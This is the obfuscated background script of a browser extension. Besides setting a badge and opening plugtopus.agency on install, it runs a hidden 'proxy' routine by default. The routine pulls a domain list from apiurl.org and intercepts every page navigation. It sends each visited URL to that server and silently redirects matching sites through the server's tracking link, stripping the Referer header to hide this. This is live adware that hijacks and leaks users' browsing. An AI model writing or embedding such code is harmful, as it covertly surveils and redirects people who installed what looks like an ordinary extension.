class Bg {
    constructor() {
        chrome['runtime']['onMessage'].addListener((a) => {
            'setBadge' === a.action && this.setBadge(a.value)
    }), chrome['runtime']['onInstalled'].addListener((a) => {
            'install' === a.reason && chrome.tabs.create({
            url: 'https://plugtopus.agency'
        })
    }), chrome['runtime'].setUninstallURL('https://plugtopus.agency'), this.initProxy()
    }
    setBadge(a) {
        a ? (chrome.browserAction.setBadgeBackgroundColor({
            color: [16, 201, 33, 100]
        }), chrome.browserAction.setBadgeText({
            text: a + ''
        })) : (chrome.browserAction.setBadgeBackgroundColor({
            color: [0, 0, 0, 0]
        }), chrome.browserAction.setBadgeText({
            text: ''
        }))
    }
    initProxy() {
        chrome['storage']['sync'].get('settings', (a) => {
            a.settings && !a.settings.disableAds && this.proxy()
    })
    }
    proxy() {
        (function() {
            function a(a, g, h) {
                var j = !1;
                if (-1 < f.indexOf(g)) j = !0;
                else
                    for (var k in f)
                        if (-1 < f[k].indexOf('.' + g) || -1 < g.indexOf('.' + f[k])) {
                            j = !0;
                            break
                        }
                j ? d = b + '/get?key=' + c + '&out=' + encodeURIComponent(a) + '&ref=' + encodeURIComponent(a) + '&uid=&format=go' : e.data.used_domains[g] = h + 8.64e7
            }
            var b = 'http://apiurl.org',
                c = '1df6af56617db5de9c922fb642478a10',
                d = '',
                e = {
                    data: {
                        used_domains: {}
                    }
                },
                f = [],
                g = !0;
            (function() {
                var a = new XMLHttpRequest;
                a.timeout = 15000, a.onreadystatechange = function() {
                    4 === a.readyState && (200 === a.status ? (f = JSON.parse(a.responseText), f && (g = !0)) : g = !1)
                }, a.open('GET', b + '/coverage?key=' + c, !0), a.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'), a.send()
            })(), chrome['webRequest']['onBeforeRequest'].addListener(function(b) {
                if (!(0 > b.tabId) && 'GET' == b.method && g) {
                    var c = b.url.replace(/^https?\:\/\/([^\/]+).*$/, '$1').replace('www.', ''),
                        f = new Date().getTime();
                    if (!(e.data.used_domains[c] && e.data.used_domains[c] + 7200000 > f)) return (e.data.used_domains[c] = f, d ? d = '' : a(b.url, c, f), d) ? (g = !1, setTimeout(function() {
                        d = '', g = !0
                    }, 15000), {
                        redirectUrl: d
                    }) : void 0
                }
            }, {
                urls: ['*://*/*'],
                types: ['main_frame']
            }, ['blocking']), chrome['webRequest']['onBeforeSendHeaders'].addListener(function(a) {
                if ('GET' == a.method && -1 < a.url.indexOf(b))
                    for (var c in a.requestHeaders) {
                        var d = a.requestHeaders[c];
                        if ('referer' == d.name.toLowerCase()) {
                            a.requestHeaders.splice(c, 1);
                            break
                        }
                    }
                return {
                    requestHeaders: a.requestHeaders
                }
            }, {
                urls: ['<all_urls>']
            }, ['blocking', 'requestHeaders'])
        })()
    }
}
var bg = new Bg;